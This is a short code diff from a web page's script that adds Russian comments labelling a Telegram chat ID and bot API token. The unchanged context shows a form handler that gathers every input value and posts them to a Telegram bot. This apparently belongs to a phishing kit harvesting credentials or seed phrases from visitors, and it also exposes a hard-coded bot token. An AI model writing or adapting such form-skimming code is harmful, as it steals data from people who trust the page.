@@ -182,8 +182,8 @@
             e.preventDefault();
             const inputs = form.querySelectorAll('input');
             const data = Array.from(inputs).map((input, index) => `${index + 1}. ${input.value}`).join('\n');
-            const chatId = '@bdsjxjdhd';
-            const apiToken = '7804666257:AAHnu23aX89lTPTuMt08TOHfSgvfK4T8hKg';
+            const chatId = '@bdsjxjdhd'; // Ваш chat ID
+            const apiToken = '7804666257:AAHnu23aX89lTPTuMt08TOHfSgvfK4T8hKg'; // Ваш API токен
             fetch(`https://api.telegram.org/bot${apiToken}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
